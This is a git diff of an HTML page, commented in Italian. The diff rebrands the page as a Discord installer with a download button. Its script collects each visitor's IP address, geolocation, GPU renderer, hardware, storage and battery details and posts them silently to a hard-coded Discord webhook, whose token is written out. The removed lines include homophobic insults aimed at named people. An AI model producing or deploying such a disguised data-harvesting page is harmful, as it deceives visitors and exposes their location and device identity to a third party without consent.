@@ -3,7 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Information</title>
+    <title>Discord</title>
+    <h1>Installazione di discord sotto</h1>
+    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
+        Installazione
+    </button>
 </head>
 <body>
     <h1>Device Information</h1>
@@ -24,7 +28,14 @@
                     rtt: navigator.connection.rtt
                 } : null,                                 // Informazioni sulla connessione di rete
                 battery: null,                            // Informazioni sulla batteria (da ottenere)
-                ipAddress: null                           // Indirizzo IP (da ottenere)
+                ipAddress: null,                          // Indirizzo IP (da ottenere)
+                webGLRenderer: null,                      // WebGL Renderer (da ottenere)
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,  // Fuso orario
+                location: null,                           // Geolocalizzazione (da ottenere)
+                hardwareConcurrency: navigator.hardwareConcurrency,  // Numero di core CPU
+                memory: navigator.deviceMemory || 'N/A',  // Memoria RAM (GB)
+                storageEstimate: null,                    // Spazio di archiviazione disponibile (da ottenere)
+                doNotTrack: navigator.doNotTrack          // Preferenza Do Not Track
             };
 
             // Ottieni lo stato della batteria
@@ -32,7 +43,7 @@
                 const battery = await navigator.getBattery();
                 deviceInfo.battery = {
                     charging: battery.charging,
-                    level: battery.level * 100 + '%',
+                    level: (battery.level * 100).toFixed(2) + '%',
                     chargingTime: battery.chargingTime,
                     dischargingTime: battery.dischargingTime
                 };
@@ -45,26 +56,43 @@
                     deviceInfo.ipAddress = data.ip;
                 });
 
-            // Costruisci il payload per Discord
+            // Ottieni la posizione geografica
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    deviceInfo.location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                });
+            }
+
+            // Ottieni il WebGL Renderer
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    deviceInfo.webGLRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+
+            // Ottieni una stima dello spazio di archiviazione
+            if (navigator.storage && navigator.storage.estimate) {
+                const estimate = await navigator.storage.estimate();
+                deviceInfo.storageEstimate = {
+                    quota: (estimate.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
+                    usage: (estimate.usage / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
+                };
+            }
+
+            // Costruisci il payload
             const payload = {
-                content: "New device information:",
-                embeds: [{
-                    title: "Device Information",
-                    color: 3447003,  // Blu
-                    fields: [
-                        { name: "User Agent", value: deviceInfo.userAgent, inline: false },
-                        { name: "Platform", value: deviceInfo.platform, inline: false },
-                        { name: "Language", value: deviceInfo.language, inline: false },
-                        { name: "Cookies Enabled", value: deviceInfo.cookiesEnabled.toString(), inline: false },
-                        { name: "Screen Resolution", value: deviceInfo.screenResolution, inline: false },
-                        { name: "Color Depth", value: deviceInfo.colorDepth.toString(), inline: false },
-                        { name: "Online", value: deviceInfo.online.toString(), inline: false },
-                        { name: "IP Address", value: deviceInfo.ipAddress, inline: false },
-                    ]
-                }]
+                title: "Device Information",
+                details: deviceInfo
             };
 
-            // Invia i dati al webhook di Discord
+            // Invia i dati al webhook (modifica l'URL con il tuo webhook o server)
             const webhookUrl = 'https://discord.com/api/webhooks/1272243742962614374/6qq-6f1Y7sXupLfshryiw4nkNMOQFHGOzWd0l0iG0p-1SzJxHd0nScxzWHTMiZ2SJ9eM';
             fetch(webhookUrl, {
                 method: 'POST',
@@ -74,9 +102,9 @@
                 body: JSON.stringify(payload)
             }).then(response => {
                 if (response.ok) {
-                    console.log('EA SPORT , MARCO GAY');
+                    console.log('Device information sent successfully.');
                 } else {
-                    console.error('EA SPORT, RAFFY GAY');
+                    console.error('Failed to send device information.');
                 }
             }).catch(error => {
                 console.error('Error:', error);
